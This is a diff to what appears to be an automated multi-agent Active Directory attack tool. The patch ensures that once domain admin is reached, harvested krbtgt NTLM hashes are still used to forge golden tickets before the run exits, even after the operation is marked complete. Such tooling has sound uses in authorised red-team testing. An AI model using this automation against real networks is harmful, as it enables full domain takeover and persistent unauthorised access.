@@ -955,6 +955,11 @@ async def run_multi_agent_operation(
                     f"Path: {dispatcher.shared_state.domain_admin_path or 'unknown'}"
                 )
             logger.info("Operation marked complete; skipping post-run wait")
+            # Still wait for golden ticket if DA was achieved (same as _wait_for_completion does)
+            # This is critical: _wait_for_completion() calls _wait_for_golden_ticket(), but when
+            # the orchestrator marks the operation complete (no pending tasks), we skip it.
+            # We must still forge the golden ticket before exiting!
+            await _wait_for_golden_ticket(dispatcher)
             # Still wait for running crack tasks to complete
             await _wait_for_crack_tasks(dispatcher)
         else:
@@ -2942,15 +2947,27 @@ async def _auto_golden_ticket(
 
             state = dispatcher.shared_state
 
-            # Skip if operation is complete
-            if state.completed:
-                logger.debug("Operation complete, stopping auto golden ticket")
-                break
-
             # Get domains that already have golden tickets (from persisted state)
             processed_domains = {
                 t.get("domain", "").lower() for t in state.golden_tickets if t.get("domain")
             }
+
+            # Check for unprocessed krbtgt hashes BEFORE checking completed flag.
+            # This ensures we process any krbtgt hashes even if the orchestrator
+            # marked the operation complete while we were sleeping.
+            pending_krbtgt_domains = set()
+            for hash_obj in state.all_hashes:
+                if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
+                    domain = (hash_obj.domain or "").lower()
+                    if domain and domain not in processed_domains:
+                        pending_krbtgt_domains.add(domain)
+
+            # Only exit if operation is complete AND no unprocessed krbtgt hashes
+            if state.completed and not pending_krbtgt_domains:
+                logger.debug(
+                    "Operation complete and no pending krbtgt hashes, stopping auto golden ticket"
+                )
+                break
 
             # Look for krbtgt hashes we haven't processed yet
             for hash_obj in state.all_hashes:
